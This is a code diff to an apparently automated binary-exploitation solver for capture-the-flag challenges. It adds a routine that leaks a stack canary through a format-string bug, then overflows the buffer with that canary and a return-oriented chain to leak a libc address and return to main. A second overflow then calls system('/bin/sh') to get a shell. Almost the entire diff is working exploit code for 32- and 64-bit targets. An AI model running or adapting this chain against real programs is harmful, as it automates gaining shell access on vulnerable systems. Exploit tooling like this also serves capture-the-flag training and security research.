@@ -110,7 +110,10 @@ def solve(ch: Challenge, max_attempts: int = 80, verbose: bool = True,
                 return res
             tried += 1
             t1 = time.time()
-            if plan.tag == "flag":
+            if plan.tag.startswith("canary:"):
+                ok, detail, out = _try_canary_fmt(ch, f, plan)
+                att = Attempt(plan.strategy, plan.desc, ok, time.time() - t1, out)
+            elif plan.tag == "flag":
                 r = execute_flag(ch, plan.sends)
                 ok, detail, out = r.ok, r.note, r.output
                 att = Attempt(plan.strategy, plan.desc, ok, time.time() - t1, r.output, r.error)
@@ -208,6 +211,103 @@ def _try_ret2libc(ch: Challenge, f: Facts, plan: S.Plan):
             p.close()
         except Exception:
             pass
+
+
+def _try_canary_fmt(ch: Challenge, f: Facts, plan: S.Plan):
+    """fmt 泄漏 canary -> 溢出泄漏 GOT -> 回 main -> system('/bin/sh')，全程同进程。"""
+    import time as _t
+    from .run import spawn, verify_shell, FLAG_RE
+
+    _, _, meta = plan.tag.partition(":")
+    off_s, sink = (meta.split(":") + [""])[:2]
+    off = int(off_s)
+    leak_name = "puts" if ch.plt("puts") else "write"
+    leak_plt = ch.plt(leak_name)
+    got = ch.got(leak_name)
+    main = ch.var("main")
+    libc = ch.libc_elf
+    if not (leak_plt and got and main and libc):
+        return False, "missing plt/got/libc", b""
+
+    bits = ch.elf.bits
+    probe = b"AAAA." + b".%p" * 60
+
+    for cand in range(8):
+        try:
+            p = spawn(ch)
+        except Exception as exc:
+            return False, f"spawn failed: {exc}", b""
+        out = b""
+        try:
+            _t.sleep(0.1)
+            out += p.recvrepeat(0.06)
+            # ---- 第一次 gets：格式化字符串泄漏
+            p.send(probe + b"\n" if sink in S.TERM_SINKS else probe)
+            _t.sleep(0.2)
+            out += p.recvrepeat(0.2)
+            cands = S._canary_candidates(out, bits)
+            if __import__("os").environ.get("AUTOPWN_DEBUG"):
+                print(f"      [dbg] canary cands={[hex(c) for c in cands]} out={out[:60]!r}")
+            if not cands:
+                return False, "no canary candidate", out
+            if cand >= len(cands):
+                return False, "candidates exhausted", out
+            canary = cands[cand]
+
+            # ---- 第二次 gets：带 canary 溢出，泄漏 GOT 后回 main
+            # canary 在 rbp-0xc(i386) / rbp-0x8(amd64)，由帧偏移推算它在缓冲区后的位置
+            rbp_disp = off - ch.wordsize
+            canary_off = rbp_disp - (8 if bits == 64 else 12)
+            if canary_off <= 0:
+                continue
+            pad = b"A" * canary_off
+            tail = b"B" * (off - canary_off - ch.wordsize)
+            if bits == 64:
+                ret = f.gadgets.get("ret")
+                pop_rdi = f.gadgets.get("pop_rdi")
+                if not pop_rdi:
+                    return False, "no pop rdi", out
+                chain = (ch.p64(ret if ret else pop_rdi) if ret else b"")
+                chain += ch.p64(pop_rdi) + ch.p64(got) + ch.p64(leak_plt) + ch.p64(main)
+            else:
+                chain = ch.p32(leak_plt) + ch.p32(main) + ch.p32(got)
+            stage1 = pad + ch.p64(canary) + tail + chain
+            p.send(stage1 + (b"\n" if sink in S.TERM_SINKS else b""))
+            _t.sleep(0.25)
+            out += p.recvrepeat(0.25)
+
+            base = _find_libc_base(out, libc, leak_name)
+            if __import__("os").environ.get("AUTOPWN_DEBUG"):
+                print(f"      [dbg] canary={hex(canary)} stage1 out={out[-80:]!r} base={base and hex(base)}")
+            if base is None:
+                continue
+            system = base + libc.sym["system"]
+            try:
+                binsh = base + next(libc.search(b"/bin/sh"))
+            except StopIteration:
+                continue
+
+            # ---- 回到 main 后：第一次 gets 喂空行，第二次 gets 打通
+            p.send(b"\n")
+            _t.sleep(0.12)
+            if bits == 64:
+                chain2 = (ch.p64(f.gadgets["ret"]) if f.gadgets.get("ret") else b"")
+                chain2 += ch.p64(f.gadgets["pop_rdi"]) + ch.p64(binsh) + ch.p64(system)
+            else:
+                chain2 = ch.p32(system) + ch.p32(0) + ch.p32(binsh)
+            stage2 = pad + ch.p64(canary) + tail + chain2
+            p.send(stage2 + (b"\n" if sink in S.TERM_SINKS else b""))
+            _t.sleep(0.2)
+            r = verify_shell(p)
+            out += r.output
+            if r.ok:
+                return True, f"canary={hex(canary)} base={hex(base)}", out
+        finally:
+            try:
+                p.close()
+            except Exception:
+                pass
+    return False, "canary attempts failed", b""
 
 
 def _find_libc_base(out: bytes, libc, name: str) -> Optional[int]:
